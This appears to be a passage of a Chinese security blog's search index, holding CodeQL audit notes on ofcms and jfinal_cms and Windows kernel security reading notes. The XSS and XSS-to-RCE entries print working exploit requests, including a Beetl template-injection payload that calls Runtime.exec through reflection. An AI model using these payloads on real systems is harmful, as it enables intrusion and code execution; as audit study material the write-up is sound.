this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.api.ApiBase\") and this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.admin.controller.%Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" )or ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.jfinal.core.Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" ) } } sink\u7684\u5b9a\u4e49\u5c31\u591a\u4e86\u3002","title":"ofcms\u5ba1\u8ba1\u8bd5\u6c34"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_11","text":"\u6211\u4eec\u53ef\u4ee5\u5148\u5b9a\u4e49\u6587\u4ef6\u7c7b\u7684sink\uff0cjava\u7684\u6587\u4ef6\u7c7b\u64cd\u4f5c\u5927\u591a\u4f1a\u7528\u5230\u7c7bjava.io.File\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49sink\u4e3ajava.io.File\u7684\u6784\u9020\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570 class SinkFile extends ClassInstanceExpr { SinkFile(){ this.getConstructor().getDeclaringType*().hasQualifiedName(\"java.io\",\"File\" ) } }","title":"\u6587\u4ef6\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_12","text":"\u4e5f\u53ef\u4ee5\u4ee5\u6a21\u677f\u6ce8\u5165\u4e3a\u601d\u8003\u7684\u5bf9\u8c61\uff0c\u5c06\u6e32\u67d3\u76f8\u5173\u65b9\u6cd5\u7684\u53c2\u6570\u8bbe\u4e3asink com.jfinal.core.Controller\u4e2d\u5b9a\u4e49\u4e86\u8fd9\u4e9b\u6e32\u67d3\u65b9\u6cd5 class SinkRender extends MethodAccess{ SinkRender(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 6)=\"render\" } } \u641e\u4e86\u4e0a\u9762\u51e0\u4e2asink\uff0c\u6211\u5c31\u611f\u53d7\u5230\u4e86\u4e00\u4e9b\u56f0\u60d1\uff1a 1.\u5982\u4f55\u5feb\u901f\u5224\u65ad\u76ee\u6807\u9879\u76ee\u7528\u4e86\u54ea\u4e9b\u4f9d\u8d56\uff1f 2.\u5982\u4f55\u5feb\u901f\u627e\u5230\u76ee\u6807\u9879\u76ee\u7684sink\u70b9\uff1f \u5bf9\u4e8e\u95ee\u98981\uff0c\u6211\u76ee\u524d\u60f3\u5230\u6700\u597d\u7684\u65b9\u6cd5\u5c31\u662f\u770bpom.xml \u5bf9\u4e8e\u95ee\u98982\uff0c\u6211\u76ee\u524d\u60f3\u5230\u7684\u65b9\u6848\u662f\u770b\u770bcodeql\u81ea\u5e26\u7684ql\u6587\u4ef6\u4e2d\u662f\u5982\u4f55\u5b9a\u4e49ql\uff0c\u53bb\u8fd9\u91cc\u9762\u627e\u627e\u7075\u611f","title":"\u6a21\u677f\u6e32\u67d3\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#jfinal_cms","text":"\u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u7b2c\u4e00\u6b21\u5ba1\u8ba1","title":"jfinal_cms \u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_13","text":"jfinal_cms\u4e5f\u662f\u57fa\u4e8ejfinal\u7684\uff0c\u8fd9\u7ed9\u6211\u4eecsource\u7684\u5b9a\u4e49\u63d0\u4f9b\u4e86\u4fbf\u5229\uff0c\u76f4\u63a5\u7167\u6284\u5fae\u6539\u4e00\u4e0b\u4e0a\u4e00\u5c0f\u8282ofcms\u7684source class ControllerSource extends MethodAccess{ ControllerSource(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 3)=\"get\" } } sink\uff0c\u5148\u6765\u6307\u5b9anew File abstract class Sink extends Top{ abstract Expr getInput(); } class FileConstructorSink extends ClassInstanceExpr,Sink{ FileConstructorSink(){ //this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"File\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"Writer\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"Reader\") or this.getConstructor().getDeclaringType*().getASupertype*().hasQualifiedName(\"java.io\",\"FileInputStream\") } override Expr getInput(){ result=this.getAnArgument() } } \u626b\u51fa\u6765\u4e09\u4e2a\uff0c\u90fd\u4e0d\u80fd\u6253\u3002\u770b\u770b\u5176\u5b83\u76ee\u6807\u5427 \u6307\u5b9arender class RenderSink extends Sink,MethodAccess{ RenderSink(){ this.getMethod().getDeclaringType*().hasQualifiedName(\"com.jfinal.core\", \"Controller\") and this.getMethod().getName().substring(0, 6)=\"render\" } override Expr getInput(){ result=this.getAnArgument() } } \u540c\u6837 \u4e5f\u6ca1\u6709\u4ec0\u4e48\u6536\u83b7\uff0c\u76f4\u5230\u6211\u6dfb\u52a0\u4e86\u4e0b\u9762\u7684\u8fd9\u4e24\u4e2aAdditionalTaintStep class TaintFix1 extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(EnhancedForStmt fs | node1.asExpr()=fs.getExpr() and node2.asExpr()=fs.getVariable() ) } } class TaintFix2 extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma | node1.asExpr()=ma.getQualifier() and node2.asExpr()=ma ) } } 16\u4e2a\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u679c\u90fd\u5f88\u957f\uff0c\u6162\u6162\u770b\u3002\u6700\u540e\u53ea\u627e\u5230\u4e86\u4e0b\u9762\u4e24\u4e2a\u80fd\u6253\u7684","title":"\u521d\u6b21\u5c1d\u8bd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#xss","text":"url: http://localhost:8080/jfinal_cms/admin/filemanager post:content=\\ alert(1)\\ \\&mode=savefile\\&path=template/bbs/message/show_message.html \u7b80\u5355\u8bb2\u4e00\u4e0bpost\u91cc\u9762\u53c2\u6570\u7684\u610f\u4e49\uff0cmode\u8bbe\u7f6e\u4e3asavefile\u4e14post\u53d1\u5305\uff0c\u5c31\u4f1a\u8fdb\u5165savefile\u65b9\u6cd5 \u7136\u540e\u5c31\u4f1a\u4ee5\u5c06path\u7684\u503c\u62fc\u63a5\u5728\u7f51\u9875\u6839\u76ee\u5f55\u540e\u9762\uff0c\u8fd9\u6837\u83b7\u5f97\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\uff0c\u7136\u540e\u518d\u5c06content\u91cc\u7684\u5185\u5bb9\u5199\u5165\u5230\u8fd9\u4e2a\u7edd\u5bf9\u8def\u5f84\u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\u3002 \u6211\u4eec\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06xss payload\u5199\u5165\u9759\u6001html\u6587\u4ef6\uff0c\u9020\u6210xss\u653b\u51fb \u4f46\u8bf4\u5b9e\u8bdd\u3002\u6ca1\u5565\u5375\u7528\u3002 **\u4e00\u4e9b\u56f0\u96be ** \u8fd9\u4e2a\u6d1e\u7684path\u53c2\u6570\u6709\u4e00\u4e2awaf \u6211\u8fd8\u6ca1\u60f3\u51fa\u600e\u4e48\u7ed5\u6210\u76ee\u5f55\u7a7f\u8d8a\uff0c\u5982\u679c\u80fd\u7ed5\u51fa\u76ee\u5f55\u7a7f\u8d8a\u5c31\u662f\u4efb\u610f\u6587\u4ef6\u5199\u4e86","title":"XSS"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#xssrce","text":"\u6211\u4eec\u521a\u521a\u63d0\u5230\uff0c\u53ef\u4ee5\u5bf9\u6a21\u677f\u6587\u4ef6\u4efb\u610f\u5199\u5165\u5185\u5bb9\u561b\u3002 \u5728\u6b64\u4e4b\u524d\u6211\u4e00\u76f4\u4ee5\u4e3a\u4f5c\u7528\u4ec5\u9650\u4e8eXSS\u4e86\uff0c\u4f46\u662f\u8f6c\u5ff5\u4e00\u60f3\uff0c\u65e2\u7136\u63a7\u5236\u6a21\u677f\u6587\u4ef6\u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6a21\u677f\u6ce8\u5165\u4e86\u554a\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u7528Runtime.getRuntime().exec()\u554a\u3002 \u53c2\u8003\u81ea\uff1a https://i.hacking8.com/page/21674 jfinal_cms\u6a21\u677f\u5f15\u64ce\u7528\u7684beetl\uff0cbeetl\u9ed8\u8ba4\u7981\u7528 java.lang.Runtime \u548c java.lang.Proces \uff0c\u6240\u4ee5\u8981\u7ed5\u8fc7\u4e00\u4e0b content=${@java.lang.Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", @java.lang.Class.forName(\"java.lang.String\")).invoke( @java.lang.Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null),\"calc\")}&mode=savefile&path=template/bbs/message/show_message.html \u7136\u540e\uff0c\u6316\u4e0d\u52a8\u4e86\uff0c\u8fd9\u4e2acms\u7528codeql\u8dd1\u4e86\u8bb8\u591a\u6b21\u90fd\u6ca1\u6709\u80fd\u6253\u7684\uff0c\u6211\u592a\u83dc\u4e86\u3002","title":"\u4eceXSS\u5230RCE"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/","text":"\u5b89\u5168\u89c6\u89d2\u7684\u539f\u7406 \u7f51\u7edc\u534f\u8bae windows","title":"\u5b89\u5168\u89c6\u89d2\u7684\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/#_1","text":"\u7f51\u7edc\u534f\u8bae windows","title":"\u5b89\u5168\u89c6\u89d2\u7684\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/windows/","text":"windows \u539f\u7406\u63a2\u7a76 \u5b66\u751f\u65f6\u4ee3\u5b66\u7684windows","title":"windows"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/windows/#windows","text":"\u539f\u7406\u63a2\u7a76 \u5b66\u751f\u65f6\u4ee3\u5b66\u7684windows","title":"windows"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/","text":"\u539f\u7406\u63a2\u7a76 \u8bfbWINDOW SECURITY INTERNALS WITH POWERSHELL","title":"\u539f\u7406\u63a2\u7a76"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/#_1","text":"\u8bfbWINDOW SECURITY INTERNALS WITH POWERSHELL","title":"\u539f\u7406\u63a2\u7a76"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WITH%20POWERSHELL/","text":"\u8bfbWINDOW SECURITY INTERNALS WITH POWERSHELL 23\u5e748\u67082\u53f7\u51fa\u7684\u65b0\u4e66\uff0c\u611f\u89c9\u53ef\u4ee5\u3002\u770b\u4e00\u770b\u5b66\u4e60\u4e00\u4e0bwindows\u5b89\u5168\uff0c\u7cfb\u7edf\u5730\u5b66\u4e60\u3002 \u7b2c\u4e8c\u7ae0\uff1a\u5185\u6838\u603b\u8ff0","title":"\u8bfbWINDOW SECURITY INTERNALS WITH POWERSHELL"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WITH%20POWERSHELL/#window-security-internals-with-powershell","text":"23\u5e748\u67082\u53f7\u51fa\u7684\u65b0\u4e66\uff0c\u611f\u89c9\u53ef\u4ee5\u3002\u770b\u4e00\u770b\u5b66\u4e60\u4e00\u4e0bwindows\u5b89\u5168\uff0c\u7cfb\u7edf\u5730\u5b66\u4e60\u3002 \u7b2c\u4e8c\u7ae0\uff1a\u5185\u6838\u603b\u8ff0","title":"\u8bfbWINDOW SECURITY INTERNALS WITH POWERSHELL"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/","text":"\u7b2c\u4e8c\u7ae0\uff1a\u5185\u6838\u603b\u8ff0 \u76ee\u5f55 \u5b50\u7cfb\u7edf Security Reference Monitor(SRM) Object Manager \u7cfb\u7edf\u8c03\u7528 System Call\u7cfb\u7edf\u8c03\u7528 NTSTATUS Codes \u5bf9\u8c61\u53e5\u67c4 Access Masks HANDLE Duplication \u8fd9\u90e8\u5206\u6211\u6bd4\u8f83\u611f\u5174\u8da3\uff0c\u6240\u4ee5\u8df3\u8fc7\u7b2c\u4e00\u7ae0\u6765\u8bfb\u3002 windows\u5185\u6838(NTOS Kernel Executive)\u7531\u4ee5\u4e0b\u90e8\u5206\u7ec4\u6210\uff0c\u53ef\u89c1\u6709\u7740\u8bb8\u591a\u5b50\u7cfb\u7edf\uff1a \u5728API\u8c03\u7528\u4e2d\uff0cAPI\u7684\u524d\u7f00\u4e5f\u5bf9\u5e94\u7740\u5185\u6838\u4e2d\u4e0d\u540c\u5b50\u7cfb\u7edf\uff0c\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5f88\u597d\u7684\u8bc6\u522bAPI\u7684\u4f5c\u7528\u4f5c\u7528\u8303\u56f4 \u5b50\u7cfb\u7edf Security Reference Monitor(SRM) https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-security-reference-monitor \u5bf9\u4e8e\u5b89\u5168\u4eba\u5458\u6765\u8bf4\u5e94\u8be5\u662f\u6700\u91cd\u8981\u7684\u5b50\u7cfb\u7edf\uff0c\u5b83\u638c\u63a7\u7740\u7528\u6237\u6743\u9650\u7b49\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u4e1c\u897f\u3002 access token SRM \u901a\u8fc7\u5411\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u8bbf\u95ee\u4ee4\u724c\u6765\uff08access token\uff09\u5b9a\u4e49\u7528\u6237\u7684\u8eab\u4efd\u3002 \u901a\u8fc7access token\uff0cSRM\u53ef\u4ee5\u5b9e\u65bd\u8bbf\u95ee\u68c0\u67e5\uff08access check\uff09\uff1a \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u8d44\u6e90\uff08Resource\uff0c\u6bd4\u5982\u8bf4\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u6587\u4ef6\uff09\u65f6\uff0cSRM\u4f1a\u83b7\u53d6\u8d44\u6e90\u7684\u5b89\u5168\u63cf\u8ff0\u7b26\uff08security descriptor\uff09\uff0c\u7136\u540e\u4e0e\u7528\u6237\u8fdb\u7a0b\u7684access token\u8fdb\u884c\u6bd4\u5bf9\uff0c\u8ba1\u7b97access token\u7684\u8bbf\u95ee\u7b49\u7ea7\uff0c\u6216\u8005\u76f4\u63a5\u8fd4\u56de\u7981\u6b62\u8bbf\u95ee\uff0c\u4ece\u800c\u8fbe\u5230\u8d44\u6e90\u7684\u8bbf\u95ee\u7ea7\u522b\u63a7\u5236\u7684\u76ee\u7684\u3002 \u540c\u65f6SRM\u4e5f\u6709\u5ba1\u8ba1\u529f\u80fd\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u770b\u5230\u54ea\u4e2a\u7528\u6237\u8bbf\u95ee\u4e86\u54ea\u4e2a\u8d44\u6e90\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u6709\u6548\u5730\u8fdb\u884c\u6076\u610f\u8f6f\u4ef6\u7684\u6392\u67e5\u548c\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u7684\u8bca\u65ad\u3002 SID \u7528\u6237\u548c\u7528\u6237\u7ec4\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0csecurity identifiers (SIDs\uff09\u3002 \u7528\u6237\u548c\u7528\u6237\u540d\u5728SRM\u80fd\u591f\u4f7f\u7528\u524d\uff0c\u4f1a\u901a\u8fc7 Local Security Authority Subsystem\uff08\u672c\u5730\u5b89\u5168\u6743\u5a01\u5b50\u7cfb\u7edf\uff0cLSASS\uff09\u6765\u8f6c\u6362\u4e3aSID\uff0c\u4ee5\u4f9bSRM\u4f7f\u7528\u3002 \u5fae\u8f6f\u5b9a\u4e49\u4e86Security Descriptor Definition Language(SDDL) \u6765\u5c06SID\u4ee5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u5c55\u793a\uff1a\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u901a\u8fc7powershell\u7684get-ntsid\u51fd\u6570\u83b7\u53d6\u4e00\u4e2a\u7528\u6237\u6216\u7528\u6237\u7ec4\u7684SID\u5b57\u7b26\u4e32\u3002 \u4e00\u4e2aSID\u5b57\u7b26\u4e32\u5927\u6982\u957f\u8fd9\u6837\uff1a S-1-5-21-330569006-3445065962-2600463357-500\u3002 \u7b2c\u4e00\u9879S\u8868\u793a\u8be5\u5b57\u7b26\u4e32\u662fSID\uff1b\u7b2c\u4e8c\u9879\u662fSID\u7684\u7248\u672c\u53f7\uff0c\u56fa\u5b9a\u4e3a1\uff1b\u7136\u540e\u662f\u6807\u5fd7\u7b26\u7684\u9881\u53d1\u673a\u6784\uff08identifier authority\uff09\uff0c\u9881\u53d1\u673a\u6784\u5c31\u662fNT\uff0c\u503c\u662f5\u3002\u7136\u540e\u8868\u793a\u4e00\u7cfb\u5217\u7684\u5b50\u9881\u53d1\u673a\u6784\uff0c\u524d\u9762\u51e0\u9879\u662f\u6807\u5fd7\u57df\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u6807\u5fd7\u7740\u57df\u5185\u7684\u5e10\u6237\u548c\u7ec4\u3002 Object Manager https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-object-manager \u5728linux\u91cc\uff0c\u6240\u6709\u4e1c\u897f\u90fd\u662f\u6587\u4ef6\uff1b\u800c\u5728windows\u91cc\uff0c\u6240\u6709\u4e1c\u897f\u90fd\u662f\u5bf9\u8c61\uff08\u6587\u4ef6\u3001\u8bbe\u5907\u3001\u540c\u6b65\u673a\u5236\u3001\u6ce8\u518c\u8868\u9879\u7b49\u7b49\u7b49\u7b49\uff09\uff0c\u5728\u5185\u6838\u91cc\u90fd\u662f\u4ee5\u5bf9\u8c61\u7ed3\u6784\u5b58\u5728\u3002 Object Manager\u5c31\u662fwindows\u91cc\u7ba1\u6240\u6709\u8d44\u6e90\u7684\u5b50\u7cfb\u7edf\u3002 ** Object Type \u5bf9\u8c61\u7c7b\u578b** windows\u5185\u6838\u7ef4\u62a4\u7740\u4e00\u4efd\u8bb0\u5f55\u6240\u652f\u6301\u5bf9\u8c61\u7684\u7c7b\u578b\u7684\u6e05\u5355\u3002 \u8fd9\u91cc\u7a0d\u5fae\u5217\u51e0\u4e2a Files Devices Threads Processes Events Mutexes Semaphores Registry keys Jobs Sections Access tokens Symbolic links Object Manager NameSpace\uff08OMNS\uff09 windows \u5185\u6838\u4e2d\u6709\u4e00\u5957\u989d\u5916\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5373 Object Manager Namespace\u3002\u5b98\u65b9\u5bf9\u5b83\u62ab\u9732\u4e0d\u591a\u3002 OMNS\u57fa\u4e8eDirectory \u5bf9\u8c61\u5efa\u7acb\uff0c\u5b83\u770b\u4e0a\u53bb\u548c\u666e\u901a\u7528\u6237\u6240\u80fd\u63a5\u89e6\u5230\u7684\u6587\u4ef6\u7cfb\u7edf\uff08\u5c31\u50cfexplore\u6253\u5f00\u7684\u4e00\u6837\uff09\u5dee\u4e0d\u591a\uff0c\u5c31\u50cf\u4e0b\u56fe\u4e00\u6837 \u5728OMNS\u4e2d\u6709\u51e0\u4e2a\u5e7f\u4e3a\u4eba\u77e5\u7684\u76ee\u5f55\uff0c\u5982\u4e0b\u56fe \u5176\u4e2dBaseNamedObjects\u76ee\u5f55\uff08BNO\uff09\u53ef\u4ee5\u5141\u8bb8\u4efb\u4f55\u7528\u6237\u521b\u9020\u6709\u540d\u5b57\u7684\u5185\u6838\u5bf9\u8c61\uff08\u6ce8\u610f\u7684\u662f\u5728BNO\u76ee\u5f55\u521b\u5efa\u5bf9\u8c61\u5e76\u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u4e60\u4fd7\uff09\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u4e24\u4e2a\u7528\u6237\u5171\u4eab\u8d44\u6e90\u3002 \u7cfb\u7edf\u8c03\u7528 System Call\u7cfb\u7edf\u8c03\u7528 \u7528\u6237\u6001\u5e94\u7528\u53ef\u4ee5\u901a\u8fc7SystemCall\u53bb\u8bbf\u95eeOMNS\u91cc\u7684\u5bf9\u8c61\uff1a\u5728\u7528\u6237\u5c42\u8c03\u7528SystemCall\u63a5\u53e3\u8c03\u7528\u5185\u6838\u5c42\u4ee3\u7801\u53bb\u8bbf\u95ee\u6307\u5b9a\u5bf9\u8c61\u3002 SystemCall\u7684API\u4f1a\u4ee5Nt\u6216\u8005Zw\u5f00\u5934\u3002\u5bf9\u4e8e\u7528\u6237\u6001\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u524d\u7f00\u90fd\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u5bf9\u4e8e\u5185\u6838\u6001\u6765\u8bf4\uff0cZw\u524d\u7f00\u7684API\u4f1a\u6539\u53d8\u5b89\u5168\u68c0\u67e5\u8fdb\u7a0b\uff08\u7b2c\u4e03\u7ae0\u7ec6\u8bf4\uff09\u3002 NtCreateMutant\u7ed3\u6784 \u4e0b\u9762\u5c06\u4ee5NtCreateMutant\u8bb2\u89e3\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528API\u7684\u7ed3\u6784 \u7cfb\u7edf\u8c03\u7528\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u53e5\u67c4\uff08HANDLE\uff09\uff0c\u5728\u51fd\u6570\u6210\u529f\u6267\u884c\u65f6\u4f5c\u4e3a\u4e00\u4e2a\u5df2\u6253\u5f00\u7684\u5bf9\u8c61\u7684\u53e5\u67c4\uff0c\u901a\u8fc7\u5176\u5b83\u7cfb\u7edf\u8c03\u7528\u6765\u4f7f\u7528\u8be5\u53e5\u67c4\u53bb\u8bbf\u95ee\u5c5e\u6027\u5e76\u8fdb\u884c\u64cd\u4f5c\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570DesiredAccess\uff0c\u8868\u793a\u8c03\u7528\u8005\u8d4b\u4e88\u53e5\u67c4\u7684\u6743\u9650\uff0c\u5728\u540e\u7eed\u4f1a\u66f4\u8be6\u7ec6\u8ba8\u8bba\u8fd9\u4e2a\u53c2\u6570\uff0c\u56e0\u4e3a\u5b83\u4e0eSRM\u76f8\u5173 \u7b2c\u4e09\u4e2a\u5219\u4e3aObjectAttributes\uff0c\u5b9a\u4e49\u4e86\u8981\u6253\u5f00\u6216\u521b\u5efa\u7684\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5b83\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u7ed3\u6784\u5982\u4e0b ObjectAttributes\u7b2c\u4e00\u4e2a\u53c2\u6570Length\u8868\u793a\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7684\u603b\u957f\u5ea6\uff0c\u7528\u4e8e\u786e\u4fdd\u6574\u4e2a\u7ed3\u6784\u4f53\u90fd\u88ab\u4f20\u9012\u8fdb\u7cfb\u7edf\u8c03\u7528\u8fc7\u7a0b\u91cc\u3002 ObjectAttributes\u7b2c\u4e8c\u4e2a\u53c2\u6570\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570RootDirectory\uff0c\u5b83\u4eec\u540c\u65f6\u4f7f\u7528\u4ee5\u6307\u793a\u7cfb\u7edf\u8c03\u7528\u5982\u4f55\u67e5\u627e\u6b63\u5728\u8bbf\u95ee\u7684OMNS\u8d44\u6e90\uff0cRootDirectory\u662f\u4e00\u4e2a\u53e5\u67c4\uff0c\u6307\u793a\u51fa\u4e00\u4e2a\u6253\u5f00\u7684OMNS\u76ee\u5f55\u5bf9\u8c61\u53e5\u67c4\u3002ObjectName\u5b57\u6bb5\u662f\u4e00\u4e2a\u6307\u5411UNICODE_STRING\u7ed3\u6784\u7684\u6307\u9488\uff08\u5982\u4e0b\uff09\uff0c\u7528\u4e8e\u4ece\u7f13\u51b2\u533a\u63a5\u6536\u5b57\u7b26\u4e32\u5bf9\u8c61\u3002 \u5982\u679c\u60f3\u8981\u6307\u5411\\BaseNamedObjects\\ABC\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ec5\u8bbe\u7f6eObjectName\u4e3a\\BaseNamedObjects\\ABC\u6216\u8005\u5c06RootDirectory\u8bbe\u7f6e\u4e3a\\BaseNamedObjects\uff0cObjectName\u8bbe\u7f6e\u4e3aABC\u3002 ObjectAttributes\u7b2c\u56db\u4e2a\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u5bf9\u8c61\u540d\u79f0\u7684\u5bfb\u5740\u8fc7\u7a0b\u4ee5\u53ca\u8fd4\u56de\u7684\u53e5\u67c4\u7684\u6743\u9650\uff0c\u5982\u4e0b\u8868 ObjectAttributes\u6700\u540e\u4e24\u4e2a\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u5b89\u5168\u63cf\u8ff0\u7b26\uff08\u7b2c\u4e94\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09\u548c Security Quality of Service (SQoS\uff0c\u7b2c\u56db\u7ae0\u8be6\u7ec6\u8ba8\u8bba) 